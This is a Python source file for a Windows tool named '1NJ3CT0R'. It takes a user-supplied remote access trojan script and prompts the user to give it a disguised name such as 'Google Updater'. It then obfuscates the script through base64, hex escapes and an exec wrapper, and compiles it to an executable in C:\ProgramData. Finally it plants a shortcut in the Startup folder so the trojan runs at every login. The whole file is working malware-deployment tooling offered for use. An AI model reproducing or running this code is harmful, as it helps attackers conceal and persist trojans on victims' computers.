#alls os imports
from os import system as sys
from os import environ as env
from os import environ as env
from os import rename
import os
#others imports
from time import sleep as slp
from base64 import b64encode
from win32com.client import Dispatch
from plyer import notification as ntf
from pystyle import Colors, Colorate, Anime, Write, Center
#paths definitions 
apd = env['appdata']
startup_path = f"{apd}\Microsoft\Windows\Start Menu\Programs\Startup"
#windows title
sys(f"title 1NJ3CT0R by CR4SH3D")

#error message
def error(x):
        ntf.notify(
            title='1J3CT0R',
            message=f'ERROR: ({x})...',
            timeout=10
        )

#clear() command 
def clear():
    sys("cls")

#check if cx_freeze installe
def cx_freeze_checker(r):
    try:
        import cx_Freeze
    except:
        error("CX_Freeze not installed !")
        clear()
        slp(1)
        Write.Print(r, Colors.red, interval=0)
        Write.Print("\nCX_Freeze installation started..\n", Colors.red, interval=0.0025)
        try:
            sys("pip install cx_freeze")
            clear()
            Write.Print("\nCX_Freeze succefuly installed !", Colors.red, interval=0.0025)
        except:
            error("python not installed !")
            Write.Print(r, Colors.red, interval=0)
            Write.Print("\nPython not installed. Please install python and retry...", Colors.red, interval=0.0025)
            exit()

#file obfuscator
def obfuscator(f_content):
    OFFSET = 10
    VAR = '__SKID_OO' * 100
    try:
        b64_content = b64encode(f_content.encode()).decode()
        index = 0
        code = f'{VAR} = ""\n'
        for _ in range(int(len(b64_content) / OFFSET) + 1):
            _str = ''
            for char in b64_content[index:index + OFFSET]:
                byte = str(hex(ord(char)))[2:]
                if len(byte) < 2:
                    byte = '0' + byte
                _str += '\\x' + str(byte)
            code += f'{VAR} += "{_str}"\n'
            index += OFFSET
        code += f'exec(__import__("\\x62\\x61\\x73\\x65\\x36\\x34").b64decode({VAR}.encode("\\x75\\x74\\x66\\x2d\\x38")).decode("\\x75\\x74\\x66\\x2d\\x38"))'
        return code
    except:
        error("Obfuscation")
        pass

#obf file moover
def obf_file(base_path):
    try:
        with open(base_path, 'r', encoding='utf-8', errors='ignore') as file:
            f_content = file.read()
        obfuscated_content = obfuscator(f_content)
        os.remove(base_path)
        with open(base_path, 'w') as file:
            file.write(obfuscated_content)
    except:
        error("Obfuscation")
        exit()

#convert file (py) to exe
def exe(sfname, logopath):
    try:
        path = f'C:\\ProgramData\\{sfname}'
        rpath = r"{}".format(path)
        sys(f'cxfreeze {sfname}.py --target-dir {rpath} --icon {logopath}')
    except:
        error("Compiler")
        exit()

#create shortcut in startup
def shortcut(x, app_name):
    try:
        path = f'C:\\ProgramData\\{app_name}'
        shortcut_path =os.path.join(x, f'{app_name}.lnk')
        target = f"{path}\\{app_name}.exe" 
        icon = f"{path}\\{app_name}.exe" 
        shell = Dispatch("WScript.Shell")
        shortcut = shell.CreateShortCut(shortcut_path)
        shortcut.Targetpath = target
        shortcut.IconLocation = icon
        shortcut.save()
    except:
        error("Shortcut")
        exit()

#injector main
def injector(startup_path, base_path, sfname, r, logopath):
    obf_file(base_path)
    rename(base_path, f"{sfname}.py")
    exe(sfname, logopath)
    shortcut(startup_path, sfname)
    clear()
    Write.Print(r, Colors.red, interval=0)
    Write.Input(f"\n-> File succefuly created in C:\ProgramData\{sfname} ! \n-> Shortcut succefuly created in startup folder !\n-> Done ;) !\nPress enter to exit...", Colors.red, interval=0.0025)

#main code
def main():
    characters = """ '," """
    r= """ ██╗███╗   ██╗     ██╗███████╗ ██████╗████████╗ ██████╗ ██████╗ 
███║████╗  ██║     ██║██╔════╝██╔════╝╚══██╔══╝██╔═████╗██╔══██╗
╚██║██╔██╗ ██║     ██║█████╗  ██║        ██║   ██║██╔██║██████╔╝
 ██║██║╚██╗██║██   ██║██╔══╝  ██║        ██║   ████╔╝██║██╔══██╗
 ██║██║ ╚████║╚█████╔╝███████╗╚██████╗   ██║   ╚██████╔╝██║  ██║
 ╚═╝╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝"""
    clear()
    Anime.Fade(Center.Center(r), Colors.red_to_black, Colorate.Vertical, enter=True)
    cx_freeze_checker(r)
    Write.Print(r, Colors.red, interval=0)
    Write.Print("\nby CR4SH3D © | Enjoy ;)", Colors.red, interval=0.0025)
    #file future name set
    fname = Write.Input("\n=======================\n\nEnter RAT name (Google Updater, Microsoft edge....) here ->", Colors.red, interval=0.0025)
    sfname= fname.replace(" ", "_")

    if fname=="":
        fname="Error"
        error("Invalid file name ")
        exit()         
    else: 
        pass
    
    #file base path set
    Write.Print("=====", Colors.red, interval=0.0025)
    path = Write.Input("\nDrag your RAT here (only .py file, no spaces in the name)->", Colors.red, interval=0.0025)
    try:
        if path=="":
            error("Invalid path")
            exit()
        else:
            base_path = ''.join( x for x in path if x not in characters)
    except:
        error("Set Path")
        exit()
    
    #logo path set 
    Write.Print("=====", Colors.red, interval=0.0025)
    logo = Write.Input("\nDrag your RAT logo here (only .ico file, no spaces in the name)->", Colors.red, interval=0.0025)
    if logo == "":
        error("Invalid Logo")
        exit()
    else:
        logopath = ''.join( x for x in logo if x not in characters)

    #file infos verifications before convert and inject                                                                          
    Write.Print("=====", Colors.red, interval=0.0025)
    Write.Input(f"""\nFile Infos :
>File path: {base_path}
>Logo Path: {logopath}
>Final file name: {fname}
>Final file path: C:\ProgramData\{sfname}
>Final shortcut path: {startup_path}\{sfname}

Press enter to start the injection....""", Colors.red, interval=0.0025)
    #injection starter
    try:
        sys("cls")
        sys("color C")
        injector(startup_path, base_path, sfname, r, logopath)
    except:
        sys("cls")
        error("Fatal Error.. Pls retry")
        Write.Print(r, Colors.red, interval=0)
        Write.Input("\nby CR4SH3D © | An Error was ocurred, Please try again...", Colors.red, interval=0.0025)
        exit()

main()
